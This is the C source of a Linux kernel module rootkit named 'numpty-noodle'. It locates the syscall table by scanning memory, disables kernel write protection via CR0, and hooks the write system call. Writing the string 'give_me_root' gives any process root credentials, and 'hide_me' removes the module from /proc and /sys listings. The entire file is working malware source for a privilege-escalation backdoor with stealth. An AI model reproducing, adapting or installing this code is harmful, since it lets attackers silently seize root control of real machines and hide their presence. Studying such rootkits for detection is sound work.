#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/slab.h>
#include <linux/cred.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");

// Definitions and Macros
#define DEVICE_NAME "numpty-noodle"

// We define the region in memory to search for the syscall table
#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize;
#endif

/* Local Variables */
struct list_head * module_prev;
struct kobject * kobj_prev;
asmlinkage ssize_t (* o_write)(int fd, const char __user *buff, ssize_t count);
psize ** syscall_table; 
bool hidden = false; 

/* Method Prototypes */
int rk_init(void);
void rk_exit(void);

/* Function Prototypes */
void hide_module(void);
void show_module(void);
psize ** find_syscall_table(void);

/* Functions */
void enable_table_write(void) {
    // disable write-protection bit in control register cr0
    write_cr0(read_cr0() & (~0x10000));
}
void disable_table_write(void) {
    // enable write-protection bit in control register cr0
    write_cr0(read_cr0() | (0x10000));
}

void hide_module(void) {
    if (hidden) return;
    // Save previous list entry and kobj entry
    module_prev = THIS_MODULE->list.prev;
    kobj_prev = THIS_MODULE->mkobj.kobj.parent;
    // Hide from /proc/modules/
    list_del_init(&THIS_MODULE->list);
    // Hide from /sys/modules/
    kobject_del(&THIS_MODULE->mkobj.kobj);
    hidden = true;
    printk(KERN_INFO "[%s] into the shadows.\n", DEVICE_NAME); // DEBUG
}

void show_module(void) {
    if (!hidden) return;
    list_add(&THIS_MODULE->list, module_prev);
    kobject_add(&THIS_MODULE->mkobj.kobj, kobj_prev, THIS_MODULE->name);
    hidden = false;
    printk(KERN_INFO "[%s] out of the shadows.\n", DEVICE_NAME); // DEBUG
   
}

void give_me_root(void) {
    struct cred * creds;
    printk(KERN_INFO "[%s] root.\n", DEVICE_NAME);
    
    creds = prepare_creds();
    creds->uid.val = creds->euid.val = 0;
    creds->gid.val = creds->egid.val = 0;

    commit_creds(creds);
    return;
}

psize ** find_syscall_table(void) {
    psize nav = START_CHECK;
    psize ** syscall_table;
    while (nav < END_CHECK) {
        syscall_table = (psize **) nav;
        // Check if the offset is equal to the address of the corresponding function.
        if (syscall_table[__NR_close] == (psize *) sys_close) {
            return &syscall_table[0]; 
        }
        nav += sizeof(void *);
    }
    return NULL;
}

asmlinkage ssize_t numpty_write(int fd, const char __user *buff, size_t count) {
    char * pass_root = "give_me_root";
    char * pass_hide = "hide_me";
    char * pass_unhide = "unhide_me";
    char *kbuff = (char *) kmalloc(256 * sizeof(char),GFP_KERNEL);
    copy_from_user(kbuff,buff,255);
    if (strstr(kbuff,pass_root)) {
        give_me_root();
    } else if (strstr(kbuff,pass_unhide)) {
        show_module();
    } else if (strstr(kbuff,pass_hide)) {
        hide_module();
    } 
    return o_write(fd,buff,count);;
}

int rk_init(void) {
    // hide_module();
    printk(KERN_INFO "[%s] module loaded\n", DEVICE_NAME); // DEBUG
    if ( (syscall_table = find_syscall_table()) ) {
        printk(KERN_INFO "[%s] found syscall_table\n", DEVICE_NAME); // DEBUG
        // hook the write function
        enable_table_write();
        // insert our imposter function
        o_write = (void *) xchg(&syscall_table[__NR_write],numpty_write);
        disable_table_write();
    } else {
        printk(KERN_ERR "[%s] could not find syscall_table\n", DEVICE_NAME); // DEBUG
    }
    return 0;
}

void rk_exit(void) {
    printk(KERN_INFO "[%s] module removed\n", DEVICE_NAME); // DEBUG
    enable_table_write();
    // replace with original syscall
    xchg(&syscall_table[__NR_write],o_write);
    disable_table_write();
}


module_init(rk_init);
module_exit(rk_exit);